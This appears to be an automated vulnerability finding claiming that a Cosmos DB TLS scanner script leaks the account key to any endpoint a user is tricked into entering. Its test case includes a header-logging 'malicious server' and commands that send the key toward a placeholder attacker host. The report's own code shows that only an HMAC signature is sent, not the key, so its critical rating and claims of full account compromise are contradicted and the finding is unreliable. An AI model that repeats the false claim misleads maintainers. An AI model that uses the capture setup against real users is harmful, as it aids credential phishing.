- Vulnerability Name: Credential Exposure to Malicious Endpoint
- Description:
    1. An attacker crafts a malicious endpoint that mimics the appearance of a legitimate Azure Cosmos DB endpoint.
    2. The attacker uses social engineering techniques (e.g., phishing, misleading instructions) to trick a user into running the `cosmos_tls_scanner.py` script against this malicious endpoint instead of a legitimate Azure Cosmos DB endpoint.
    3. The user, believing they are testing their own Cosmos DB account, provides their Cosmos DB authorization key as a command-line argument to the script.
    4. The `cosmos_tls_scanner.py` script, as designed, sends HTTP requests to the specified endpoint to test TLS versions. These requests include the authorization key in the `authorization` header for authentication.
    5. When the script is run against the malicious endpoint, the attacker's server receives the HTTP requests, including the Cosmos DB authorization key in the header.
    6. The attacker captures and logs the authorization key from the received requests.
    7. The attacker can now use the captured authorization key to gain unauthorized access to the user's actual Azure Cosmos DB account, as the key provides full access to the Cosmos DB resources.
- Impact:
    - Full compromise of the Azure Cosmos DB account.
    - Unauthorized access to all data within the Cosmos DB account.
    - Potential data exfiltration, modification, or deletion by the attacker.
    - Loss of confidentiality, integrity, and availability of the Cosmos DB account and its data.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None. The tool currently lacks any built-in mitigations against this vulnerability.
- Missing Mitigations:
    - **Warning Message:** Display a prominent warning message to the user before execution, emphasizing the importance of using the tool only against trusted endpoints and the risks of exposing credentials to untrusted endpoints. This warning should be displayed every time the tool is run.
    - **Endpoint Validation (Limited):** Implement basic validation of the endpoint format to check if it resembles a valid Azure Cosmos DB endpoint (e.g., checking for `documents.azure.com` in the URL). However, this mitigation is limited as attackers can register domain names that look similar. This should not be relied upon as a strong security measure but rather as a minor deterrent and a hint for users to double-check.
- Preconditions:
    - The user must be tricked into running the `cosmos_tls_scanner.py` script.
    - The user must be socially engineered to provide their Cosmos DB authorization key while targeting the malicious endpoint.
    - The attacker must have control over a server acting as the malicious endpoint and be able to capture incoming HTTP requests.

- Source Code Analysis:
    1. **Argument Parsing:** The `_get_parser()` function in `cosmos_tls_scanner.py` defines the command-line arguments, including `--endpoint` and `--authorization-key`.
    ```python
    def _get_parser():
        parser = argparse.ArgumentParser(description="Azure Cosmos DB TLS Scanner")
        parser.add_argument(
            "--endpoint",
            "-e",
            required=True,
            help="Azure Cosmos DB database account endpoint. Example https://myaccount.documents.azure.com:443/",
        )
        parser.add_argument(
            "--authorization-key",
            "-k",
            required=True,
            help="Master or Read-only key for account of the form khYANAIiAl12n...==",
        )
        # ... other arguments
        return parser
    ```
    This code shows that the script is designed to accept the endpoint and authorization key as user inputs.

    2. **Request Construction and Authorization:** The `_send_request()` function sends HTTP requests using the provided endpoint and includes headers generated by `_get_auth_header()`. The `_get_auth_header()` function directly uses the provided `key` (authorization key) to generate the authentication signature.
    ```python
    def _get_auth_header(key, verb, resource_type, resource_link, date):
        # ... (code to create authorization header using the key) ...
        digest = hmac.digest(base64.b64decode(key), payload.encode("utf-8"), hashlib.sha256)
        signature = base64.encodebytes(digest).decode("utf-8")
        return urllib.parse.quote("type=master&ver=1.0&sig={}".format(signature[:-1]))

    def _send_request(
        uri, ssl_version, verb, resource_type, resource_link, headers=None, body=None
    ):
        full_url = urllib.parse.urljoin(uri, resource_link + "/")
        full_url = urllib.parse.urljoin(full_url, resource_type)
        session = requests.Session()
        session.mount("https://", SSLAdapter(ssl_version))
        response = session.request(verb, full_url, headers=headers, data=body) # Headers contain authorization key
        return response
    ```
    This demonstrates that the authorization key is included in the headers of requests sent to the provided `--endpoint`.

    3. **Vulnerable Execution Flow:** The `main()` function parses arguments and calls either `list_databases()` or `basic_query()`, which both eventually call `_send_request()` with the user-provided endpoint and authorization key. If a malicious endpoint is provided, the authorization key will be sent to it.
    ```python
    def main(args):
        args.endpoint = args.endpoint.strip()
        args.authorization_key = args.authorization_key.strip()
        # ...
        for ssl_version_name, ssl_version in ssl_versions:
            # ...
            if args.database_name and args.collection_name:
                response = basic_query(
                    args.endpoint, # User provided endpoint
                    args.authorization_key, # User provided key
                    ssl_version,
                    args.database_name,
                    args.collection_name,
                )
            else:
                response = list_databases(
                    args.endpoint, # User provided endpoint
                    args.authorization_key, # User provided key
                    ssl_version
                )
            # ...
    ```

- Security Test Case:
    1. **Set up a malicious endpoint:**
        - Create a simple HTTP server (e.g., using Python's `http.server`) that listens on a public IP address and port (e.g., port 8080).
        - Configure the server to log all incoming HTTP requests, including headers and request paths, to a file or console.
        - Example Python malicious server (simplified `malicious_server.py`):
        ```python
        from http.server import BaseHTTPRequestHandler, HTTPServer

        class MaliciousHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Malicious Endpoint - GET request received\n")
                print("GET request received:")
                print(f"  Path: {self.path}")
                print("  Headers:")
                for header, value in self.headers.items():
                    print(f"    {header}: {value}")

            def do_POST(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Malicious Endpoint - POST request received\n")
                print("POST request received:")
                print(f"  Path: {self.path}")
                print("  Headers:")
                for header, value in self.headers.items():
                    print(f"    {header}: {value}")
                content_len = int(self.headers.get('Content-Length', 0))
                post_body = self.rfile.read(content_len)
                print("  Body:")
                print(post_body.decode('utf-8'))


        if __name__ == '__main__':
            server_address = ('', 8080)
            httpd = HTTPServer(server_address, MaliciousHandler)
            print(f"Malicious server listening on port {server_address[1]}")
            httpd.serve_forever()
        ```
        - Run this malicious server on a publicly accessible machine: `python malicious_server.py`

    2. **Prepare to run the scanner:**
        - Install the `cosmos_tls_scanner.py` requirements: `pip install -r requirements.txt`
        - Obtain a valid Cosmos DB authorization key (master or read-only key - for testing, a read-only key is safer).

    3. **Execute the scanner against the malicious endpoint:**
        - Replace `https://myaccount.documents.azure.com:443/` in the command below with the public IP address or hostname of the machine running the malicious server and the port (e.g., `http://<public-ip>:8080/` or `http://<hostname>:8080/`).  **Note:** Use `http` not `https` for the malicious server unless you set up SSL for it, but for this test `http` is sufficient to demonstrate credential capture.
        - Replace `khYANAIiAl12n...==` with your valid Cosmos DB authorization key.
        ```bash
        python3 cosmos_tls_scanner.py --endpoint http://<public-ip>:8080/ --authorization-key khYANAIiAl12n...==
        ```
        Or if you are using a hostname:
        ```bash
        python3 cosmos_tls_scanner.py --endpoint http://<hostname>:8080/ --authorization-key khYANAIiAl12n...==
        ```

    4. **Verify credential capture:**
        - Check the output of the malicious server (console or log file).
        - You should see the logged HTTP requests. Examine the headers of these requests.
        - Verify that the `authorization` header is present and contains your Cosmos DB authorization key.

    5. **Expected Result:** The malicious server should successfully capture the HTTP requests sent by `cosmos_tls_scanner.py`, including the `authorization` header which contains the Cosmos DB authorization key. This confirms that the tool, when pointed to a malicious endpoint, will transmit the user's credentials to that endpoint, proving the vulnerability.